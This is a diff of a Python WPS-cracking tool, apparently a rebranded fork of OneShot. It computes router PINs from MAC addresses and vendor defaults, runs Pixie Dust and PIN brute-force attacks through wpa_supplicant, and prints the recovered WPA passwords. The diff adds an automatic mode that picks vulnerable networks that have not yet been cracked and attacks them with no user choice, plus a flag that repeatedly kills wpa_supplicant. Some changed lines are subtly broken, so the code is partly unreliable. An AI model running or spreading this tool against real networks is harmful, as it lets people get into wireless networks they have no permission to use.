@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#Open Source Code.No Need More Modification.
-# credit by me farhan
+#yes*im*farhan
 import sys
 import subprocess
 import os
@@ -17,7 +16,6 @@ import collections
 import statistics
 import csv
 from typing import Dict
-
 os.system('cls||clear')
 print("""\033[1;32m
 
@@ -40,7 +38,9 @@ print("""\033[1;32m
  \033[1;31mNote    :       ROOT DEVICES ONLY
 \033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 """)
-class NetworkAddress:
+
+
+class NetworkAddress():
     def __init__(self, mac):
         if isinstance(mac, int):
             self._int_repr = mac
@@ -93,12 +93,10 @@ class NetworkAddress:
     def __gt__(self, other):
         return self.integer > other.integer
 
-    @staticmethod
-    def _mac2int(mac):
+    def _mac2int(self, mac):
         return int(mac.replace(':', ''), 16)
 
-    @staticmethod
-    def _int2mac(mac):
+    def _int2mac(self, mac):
         mac = hex(mac).split('x')[-1].upper()
         mac = mac.zfill(12)
         mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
@@ -109,66 +107,66 @@ class NetworkAddress:
             self._str_repr, self._int_repr)
 
 
-class WPSpin:
-    """WPS pin generator"""
+class WPSpin():
+    '''WPS pin generator'''
     def __init__(self):
         self.ALGO_MAC = 0
         self.ALGO_EMPTY = 1
         self.ALGO_STATIC = 2
 
-        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
-                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
-                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
-                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
-                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
-                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
-                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
-                      # Static pin algos
-                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
-                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
-                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
-                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
-                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
-                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
-                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
-                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
-                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
-                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
-                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
-                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
-                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
-                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
-                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
-                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
-                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
-                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
-                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
-                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
-                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
-                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
-                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
+        self.algos = {}
+        self.algos['pin24'] = {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24}
+        self.algos['pin28'] = {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28}
+        self.algos['pin32'] = {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32}
+        self.algos['pinDLink'] = {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink}
+        self.algos['pinDLink1'] = {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1}
+        self.algos['pinASUS'] = {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS}
+        self.algos['pinAirocon'] = {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon}
+        # Static pin algos
+        self.algos['pinEmpty'] = {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}
+        self.algos['pinCisco'] = {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567}
+        self.algos['pinBrcm1'] = {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252}
+        self.algos['pinBrcm2'] = {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484}
+        self.algos['pinBrcm3'] = {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990}
+        self.algos['pinBrcm4'] = {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714}
+        self.algos['pinBrcm5'] = {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411}
+        self.algos['pinBrcm6'] = {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719}
+        self.algos['pinAirc1'] = {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203}
+        self.algos['pinAirc2'] = {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225}
+        self.algos['pinDSL2740R'] = {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554}
+        self.algos['pinRealtek1'] = {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146}
+        self.algos['pinRealtek2'] = {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911}
+        self.algos['pinRealtek3'] = {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371}
+        self.algos['pinUpvel'] = {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483}
+        self.algos['pinUR814AC'] = {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768}
+        self.algos['pinUR825AC'] = {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417}
+        self.algos['pinOnlime'] = {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604}
+        self.algos['pinEdimax'] = {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153}
+        self.algos['pinThomson'] = {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814}
+        self.algos['pinHG532x'] = {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928}
+        self.algos['pinH108L'] = {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988}
+        self.algos['pinONO'] = {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
 
-    @staticmethod
-    def checksum(pin):
-        """
+    def checksum(self, pin):
+        '''
         Standard WPS checksum algorithm.
         @pin — A 7 digit pin to calculate the checksum for.
         Returns the checksum value.
-        """
+        '''
         accum = 0
         while pin:
             accum += (3 * (pin % 10))
             pin = int(pin / 10)
             accum += (pin % 10)
             pin = int(pin / 10)
-        return (10 - accum % 10) % 10
+        return ((10 - accum % 10) % 10)
 
     def generate(self, algo, mac):
-        """
+        '''
         WPS pin generator
         @algo — the WPS pin algorithm ID
         Returns the WPS pin string value
-        """
+        '''
         mac = NetworkAddress(mac)
         if algo not in self.algos:
             raise ValueError('Invalid WPS pin algorithm')
@@ -180,9 +178,9 @@ class WPSpin:
         return pin.zfill(8)
 
     def getAll(self, mac, get_static=True):
-        """
+        '''
         Get all WPS pin's for single MAC
-        """
+        '''
         res = []
         for ID, algo in self.algos.items():
             if algo['mode'] == self.ALGO_STATIC and not get_static:
@@ -198,9 +196,9 @@ class WPSpin:
         return res
 
     def getList(self, mac, get_static=True):
-        """
+        '''
         Get all WPS pin's for single MAC as list
-        """
+        '''
         res = []
         for ID, algo in self.algos.items():
             if algo['mode'] == self.ALGO_STATIC and not get_static:
@@ -209,9 +207,9 @@ class WPSpin:
         return res
 
     def getSuggested(self, mac):
-        """
+        '''
         Get all suggested WPS pin's for single MAC
-        """
+        '''
         algos = self._suggest(mac)
         res = []
         for ID in algos:
@@ -227,9 +225,9 @@ class WPSpin:
         return res
 
     def getSuggestedList(self, mac):
-        """
+        '''
         Get all suggested WPS pin's for single MAC as list
-        """
+        '''
         algos = self._suggest(mac)
         res = []
         for algo in algos:
@@ -244,10 +242,10 @@ class WPSpin:
             return None
 
     def _suggest(self, mac):
-        """
+        '''
         Get algos suggestions for single MAC
         Returns the algo ID
-        """
+        '''
         mac = mac.replace(':', '').upper()
         algorithms = {
             'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
@@ -288,13 +286,13 @@ class WPSpin:
         return res
 
     def pin24(self, mac):
-        return mac.integer & 0xFFFFFF
+        return (mac.integer & 0xFFFFFF)
 
     def pin28(self, mac):
-        return mac.integer & 0xFFFFFFF
+        return (mac.integer & 0xFFFFFFF)
 
     def pin32(self, mac):
-        return mac.integer % 0x100000000
+        return (mac.integer % 0x100000000)
 
     def pinDLink(self, mac):
         # Get the NIC part
@@ -350,7 +348,7 @@ def get_hex(line):
     return a[2].replace(' ', '').upper()
 
 
-class PixiewpsData:
+class PixiewpsData():
     def __init__(self):
         self.pke = ''
         self.pkr = ''
@@ -376,7 +374,7 @@ class PixiewpsData:
         return pixiecmd
 
 
-class ConnectionStatus:
+class ConnectionStatus():
     def __init__(self):
         self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
         self.last_m_message = 0
@@ -390,7 +388,7 @@ class ConnectionStatus:
         self.__init__()
 
 
-class BruteforceStatus:
+class BruteforceStatus():
     def __init__(self):
         self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
@@ -423,7 +421,7 @@ class BruteforceStatus:
         self.__init__()
 
 
-class Companion:
+class Companion():
     """Main application part"""
     def __init__(self, interface, save_result=False, print_debug=False):
         self.interface = interface
@@ -445,8 +443,8 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         user_home = str(pathlib.Path.home())
-        self.sessions_dir = f'{user_home}/.BiRi/sessions/'
-        self.pixiewps_dir = f'{user_home}/.BiRi/pixiewps/'
+        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
+        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
         self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
         if not os.path.exists(self.sessions_dir):
             os.makedirs(self.sessions_dir)
@@ -465,11 +463,11 @@ class Companion:
             pass
 
     def sendOnly(self, command):
-        """Sends command to wpa_supplicant"""
+        '''Sends command to wpa_supplicant'''
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
 
     def sendAndReceive(self, command):
-        """Sends command to wpa_supplicant and returns the reply"""
+        '''Sends command to wpa_supplicant and returns the reply'''
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
         (b, address) = self.retsock.recvfrom(4096)
         inmsg = b.decode('utf-8', errors='replace')
@@ -648,7 +646,8 @@ class Companion:
             return None
         return pin
 
-    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
+    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None,timeout=0):
+        start_time=time.time()
         if not verbose:
             verbose = self.print_debug
         self.pixie_creds.clear()
@@ -658,14 +657,13 @@ class Companion:
         r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
-            if r == 'UNKNOWN COMMAND':
-                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
-                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
-            else:
-                print('[!] Something went wrong — check out debug log')
+            print('[!] Something went wrong — check out debug log')
             return False
 
         while True:
+            if timeout > 0 and time.time() > start_time + timeout:
+                print("\nTimeout exceeded")
+                return False
             res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
             if not res:
                 break
@@ -680,16 +678,17 @@ class Companion:
         return False
 
     def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False,timeout=0,auto=False):
         if not pin:
             if pixiemode:
                 try:
-                    # Try using the previously calculated PIN
+                    # Try using the previous calculated PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
-                            pin = t_pin
+                        if type(t_pin) == int:
+                            if auto or input('[?] Use previous calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                                pin = t_pin
                         else:
                             raise FileNotFoundError
                 except FileNotFoundError:
@@ -700,13 +699,13 @@ class Companion:
 
         if store_pin_on_fail:
             try:
-                self.__wps_connection(bssid, pin, pixiemode)
+                self.__wps_connection(bssid, pin, pixiemode, None, timeout)
             except KeyboardInterrupt:
                 print("\nAborting…")
                 self.__savePin(bssid, pin)
                 return False
         else:
-            self.__wps_connection(bssid, pin, pixiemode)
+            self.__wps_connection(bssid, pin, pixiemode, None, timeout)
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
@@ -723,7 +722,7 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True,auto=auto)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
@@ -735,9 +734,9 @@ class Companion:
             return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
-        """
+        '''
         @f_half — 4-character string
-        """
+        '''
         checksum = self.generator.checksum
         while int(f_half) < 10000:
             t = int(f_half + '000')
@@ -757,10 +756,10 @@ class Companion:
         return False
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-        """
+        '''
         @f_half — 4-character string
         @s_half — 3-character string
-        """
+        '''
         checksum = self.generator.checksum
         while int(s_half) < 1000:
             t = int(f_half + s_half)
@@ -805,7 +804,7 @@ class Companion:
                 self.__second_half_bruteforce(bssid, f_half, s_half, delay)
             raise KeyboardInterrupt
         except KeyboardInterrupt:
-            print("\nAborting…\nStay With\nFARHAN")
+            print("\nAborting…")
             filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
             with open(filename, 'w') as file:
                 file.write(self.bruteforce.mask)
@@ -824,7 +823,7 @@ class Companion:
         self.cleanup()
 
 
-class WiFiScanner:
+class WiFiScanner():
     """docstring for WiFiScanner"""
     def __init__(self, interface, vuln_list=None):
         self.interface = interface
@@ -847,8 +846,8 @@ class WiFiScanner:
         except FileNotFoundError:
             self.stored = []
 
-    def iw_scanner(self) -> Dict[int, dict]:
-        """Parsing iw scan results"""
+    def iw_scanner(self):
+        '''Parsing iw scan results'''
         def handle_network(line, result, networks):
             networks.append(
                     {
@@ -944,25 +943,22 @@ class WiFiScanner:
             return False
 
         # Sorting by signal level
-        networks.sort(key=lambda x: x['Level'], reverse=True)
-
-        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
-        network_list = {(i + 1): network for i, network in enumerate(networks)}
+        networks.sort(key=lambda x: x['Level'], reverse=not args.reverse_scan)
 
         # Printing scanning results as table
         def truncateStr(s, length, postfix='…'):
-            """
+            '''
             Truncate string with the specified length
             @s — input string
-            @length — length of output string
-            """
+            @llength — length of output string
+            '''
             if len(s) > length:
                 k = length - len(postfix)
                 s = s[:k] + postfix
             return s
 
         def colored(text, color=None):
-            """Returns colored text"""
+            '''Returns colored text'''
             if color:
                 if color == 'green':
                     text = '\033[92m{}\033[00m'.format(text)
@@ -975,7 +971,6 @@ class WiFiScanner:
             else:
                 return text
             return text
-
         if self.vuln_list:
             print('Network marks: {1} {0} {2} {0} {3}'.format(
                 '|',
@@ -986,12 +981,8 @@ class WiFiScanner:
         print('Networks list:')
         print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
             '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
-
-        network_list_items = list(network_list.items())
-        if args.reverse_scan:
-            network_list_items = network_list_items[::-1]
-        for n, network in network_list_items:
-            number = f'{n})'
+        for i, network in enumerate(networks):
+            number = '{})'.format(i + 1)
             model = '{} {}'.format(network['Model'], network['Model number'])
             essid = truncateStr(network['ESSID'], 25)
             deviceName = truncateStr(network['Device name'], 27)
@@ -1000,33 +991,43 @@ class WiFiScanner:
                 network['Security type'], network['Level'],
                 deviceName, model
                 )
+            network['Vulnerable']=False
             if (network['BSSID'], network['ESSID']) in self.stored:
                 print(colored(line, color='yellow'))
             elif network['WPS locked']:
                 print(colored(line, color='red'))
             elif self.vuln_list and (model in self.vuln_list):
                 print(colored(line, color='green'))
+                network['Vulnerable']=True
             else:
                 print(line)
 
-        return network_list
+        return networks
 
-    def prompt_network(self) -> str:
+    def prompt_network(self,auto=False):
         networks = self.iw_scanner()
         if not networks:
             print('[-] No WPS networks found.')
             return
         while 1:
             try:
-                networkNo = input('Select target (press Enter to refresh): ')
-                if networkNo.lower() in ('r', '0', ''):
-                    return self.prompt_network()
-                elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
+                if auto==True:
+                    for network in networks:
+                        if network['Vulnerable']==True and not (network['BSSID'], network['ESSID']) in self.stored:
+                            return network['BSSID']
+                    return self.prompt_network(True)
                 else:
-                    raise IndexError
+                    networkNo = input('Select target (press Enter to refresh): ')
+                    if networkNo.lower() in ('r', '0', ''):
+                        return self.prompt_network()
+                    elif int(networkNo) in range(1, len(networks) + 1):
+                        return networks[int(networkNo) - 1]['BSSID']
+                    else:
+                        raise IndexError
             except Exception:
                 print('Invalid number')
+            else:
+                break
 
 
 def ifaceUp(iface, down=False):
@@ -1049,7 +1050,7 @@ def die(msg):
 
 def usage():
     return """
-Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN
+OneShotPin 0.0.2 (c) 2017 FARHAN X ME, moded by FARHAN X ME
 
 %(prog)s <arguments>
 
@@ -1070,8 +1071,8 @@ Advanced arguments:
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
-    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     -v, --verbose            : Verbose output
+    -r, --reverse-scan       : Reverse sorting of networks in the scan. Useful on small displays
 
 Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
@@ -1082,7 +1083,7 @@ if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser(
-        description='Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN',
+        description='OneShotPin 0.0.2 (c) 2017 FARHAN X ME, moded by FARHAN X ME',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
         )
 
@@ -1115,7 +1116,7 @@ if __name__ == '__main__':
     parser.add_argument(
         '-X', '--show-pixie-cmd',
         action='store_true',
-        help='Always print Pixiewps command'
+        help='Alway print Pixiewps command'
         )
     parser.add_argument(
         '-B', '--bruteforce',
@@ -1128,6 +1129,11 @@ if __name__ == '__main__':
         help='Set the delay between pin attempts'
         )
     parser.add_argument(
+        '-t', '--timeout',
+        type=float,
+        help="Timeout of atack in seconds"
+        )
+    parser.add_argument(
         '-w', '--write',
         action='store_true',
         help='Write credentials to the file on success'
@@ -1138,34 +1144,46 @@ if __name__ == '__main__':
         help='Down network interface when the work is finished'
         )
     parser.add_argument(
-        '--vuln-list',
-        type=str,
-        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
-        help='Use custom file with vulnerable devices list'
-    )
-    parser.add_argument(
-        '-l', '--loop',
-        action='store_true',
-        help='Run in a loop'
-    )
-    parser.add_argument(
-        '-r', '--reverse-scan',
-        action='store_true',
-        help='Reverse order of networks in the list of networks. Useful on small displays'
-    )
-    parser.add_argument(
         '-v', '--verbose',
         action='store_true',
         help='Verbose output'
         )
+    parser.add_argument(
+        '-k', '--kill',
+        action='store_true',
+        help='Kill wpa_supplicant'
+    )
+    parser.add_argument(
+        '-a', '--auto',
+        action='store_true',
+        help='Automatic atack'
+        )
+    parser.add_argument(
+        '--vuln-list',
+        type=str,
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
+        )
+    parser.add_argument(
+        '-l', '--loop',
+        action='store_true',
+        help='Run in a loop'
+        )
+    parser.add_argument(
+        '-r', '--reverse-scan',
+        action='store_true',
+        help='Reverse sorting of networks in the scan. Useful on small displays'
+        )
 
     args = parser.parse_args()
-
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
         die("Run it as root")
 
+    if args.kill:
+        for count in range (0,50):
+            os.system("pkill wpa_supplicant")
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
@@ -1176,11 +1194,15 @@ if __name__ == '__main__':
                     with open(args.vuln_list, 'r', encoding='utf-8') as file:
                         vuln_list = file.read().splitlines()
                 except FileNotFoundError:
+                    print("[-] Warning: vuln list not found")
                     vuln_list = []
                 scanner = WiFiScanner(args.interface, vuln_list)
                 if not args.loop:
                     print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                args.bssid = scanner.prompt_network()
+                if args.auto:
+                    args.bssid = scanner.prompt_network(True)
+                else:
+                    args.bssid = scanner.prompt_network(False)
 
             if args.bssid:
                 companion = Companion(args.interface, args.write, print_debug=args.verbose)
@@ -1188,7 +1210,7 @@ if __name__ == '__main__':
                     companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                 else:
                     companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                args.show_pixie_cmd, args.pixie_force)
+                                                args.show_pixie_cmd, args.pixie_force,timeout=args.timeout,auto=args.auto)
             if not args.loop:
                 break
             else:
@@ -1196,12 +1218,12 @@ if __name__ == '__main__':
         except KeyboardInterrupt:
             if args.loop:
                 if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…\nStay With\nFARHAN")
+                    print("Aborting…")
                     break
                 else:
                     args.bssid = None
             else:
-                print("\nAborting…\nStay With\nFARHAN")
+                print("\nAborting…")
                 break
 
     if args.iface_down:
